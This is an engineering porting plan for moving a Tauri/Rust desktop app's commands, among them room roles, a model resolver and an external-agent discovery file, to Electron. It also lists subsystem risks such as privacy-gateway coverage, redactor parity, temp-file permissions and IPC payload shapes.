### `src-tauri/src/commands/moonshot/roles.rs` — 132 LOC → electron-main (0.25 d)

Static catalog of 5 room roles (persona + suggested prompts + command chips); apply is data-only (a setting write) and role_instructions feeds the agent's system prompt.

**Replacement:** A typed constant in TS; role_instructions lookup used by the ported agent prompt assembly.

**Must preserve:**
- 'default' and unknown ids inject EMPTY instructions; the app saves set_setting('room_role', id) and the agent reads it — the catalog itself never touches state
- opposing-counsel explicitly disclaims legal advice in its instructions

### `src-tauri/src/commands/moonshot.rs` — 129 LOC → electron-main (0.5 d)

Moonshot module hub: resolve_structured_model (the one engine-parity model resolver every structured side-call uses), the static recommended_models (embed + vision), and ensure_embed_model (best-effort pull + meta stamp + backfill kick).

**Replacement:** TS in Electron main; resolve_structured_model becomes the shared resolver in the ported engine layer; pull progress re-emitted over webContents.send.

**Must preserve:**
- resolve_structured_model: an external CLI engine resolves WITHOUT any local models installed; otherwise room setting, else best_local_default; None only when Ollama is unreachable/empty so callers degrade
- recommended_models returns EXACTLY embed+vision — a chat roster was removed as dead wire weight (the frontend owns RECOMMENDED_MODELS); the test pins the key set
- ensure_embed_model is best-effort (Ollama down → still Ok, keyword retrieval keeps working); stamps embed_model/embed_dim=768 meta once available; always spawns the embedding backfill

**Native/Tauri surface:** tauri::Emitter (pull-progress)

### `src-tauri/src/commands/moonshot/discovery.rs` — 107 LOC → electron-main (0.5 d)

The Leash discovery record: write/remove ~/.arcelle/leash.json (url, bearer token, scope, room, pid, startedAt) so an external agent self-configures without pasting.

**Replacement:** node:fs in Electron main: open with mode 0o600 AND chmod after (a leftover file keeps its looser mode otherwise), remove on stop/teardown/app exit.

**Must preserve:**
- 0600 enforced BOTH at open and via set_permissions — mode on open only applies to newly created files, and a pre-existing leftover must not keep looser permissions (tested)
- pid + startedAt are the staleness contract for readers after a crash; the next start unconditionally overwrites so leftovers self-heal
- Removal is best-effort and idempotent; ONLY the full tier ever writes this file (files-tier tokens reach the room by paste only — see server.rs)

**Native/Tauri surface:** tauri path resolver home_dir(); unix OpenOptionsExt/PermissionsExt

**Subsystem risks:**
- Privacy-door seam coverage: today ONE Rust function (inject_policy) guards both sidecar gateways, and the doc comment warns that any new gateway silently re-opens the 2026-07-25 leak. The Electron rewrite multiplies outbound seams (main-process fetch, MCP client, TTS, web search) across two processes (main TS + Python sidecar); the policy cache must live in main with a single choke-point HTTP client, or a missed seam ships raw room content to the cloud with the panel still saying On.
- Case-folding parity across engines: the redactor currently reconciles aho-corasick's ASCII-only folding with Python's re.I by adding explicit non-ASCII case variants. A JS port adds a third regime (regex 'iu'); port the explicit variant table and the pinned never-leak tests (+9725551234 inside a longer number, unspaced BenReich) rather than trusting any engine's folding.
- Sketch geometry twins: Rust sketchdoc and src/viewers/sketch/model.ts are deliberate byte-level twins (CONNECT_GAP=8, route/routeBetween, no clamping). The rewrite's single biggest simplification is merging them into ONE shared TS library — but porting both separately would re-create the drift where every agent/editor alternation rewrites the same connector into the file.
- Cancel/commit discipline: guard_commit's read-the-flag-immediately-before-the-side-effect pattern (Artifact funnel, studios, podcast audio, ai_action) is what fixed 'Studio creates files after the UI said stopped' (live QA 2026-08-03). In Node the async gaps around a save are wider; keep the DB commit synchronous (better-sqlite3) and re-read the flag inside the same tick as the transaction.
- IPC payload-shape drift: Tauri auto-camelCases command args and serde renames every response to camelCase; Electron ipcMain does neither. All 77 handlers must be rewired through src/api.ts with byte-identical shapes, and events (privacy-scan, room-files-changed, sketch-drawn with the whole doc, studio-step with the emitted 'local' flag, ask-step, skills-changed, pull-progress, agent-open-file) must keep their exact payloads — several bug fixes live IN those payloads (the doc riding sketch-drawn, the local flag not being grepped from English).
- PNG rasterization parity: to_png (resvg + bundled fontdb, emptied href resolvers, RASTER_MAX_W scaling) feeds both user exports and what vision models see of a drawing. @resvg/resvg-js is a prebuilt drop-in but fonts must be explicitly bundled and the no-external-fetch property re-asserted.
- Decrypted-plaintext temp files: video trim (0600 create_new, removed on every path), skill-run workspaces (0700, claimed-before-created, orphan sweep for SIGKILL), browser previews (grace-based sweep because /usr/bin/open returns before the browser reads) each encode a specific crash-safety rule; Node fs must set modes at open, and every sweep must survive the port or decrypted room content outlives its session.
- Leash stable identity: pasted external-agent configs depend on leash_port=17872 + leash_token surviving restarts, on store_bridge_if_current's teardown race guard (a stale bridge serving the NEXT room with THIS room's token), and on regenerate being the only revocation path. The @modelcontextprotocol/sdk bridge rewrite must preserve all three, plus files-tier tokens never touching leash.json.
- Sidecar contract stability: this subsystem leans on ~10 existing sidecar endpoints with precise degrade contracts (error-code sentinels OLLAMA_DOWN/MODEL_MISSING vs verbatim toasts vs Ok(None)-never-Err for generate_ui_text, until_hangup cancellation-by-disconnect). The rewrite keeps the sidecar, so these survive — but the new main-process HTTP client must reproduce request-drop-as-cancel and the sentinel mapping exactly.
- macOS tool dependence: avconvert (video trim) and afconvert (podcast AAC) ship with macOS and have deliberate no-ffmpeg fallbacks (re-encode preset; honest WAV fallback with truthful mime). Keep the fallback semantics — 'a big file that plays beats no episode' — rather than adding an ffmpeg dependency.
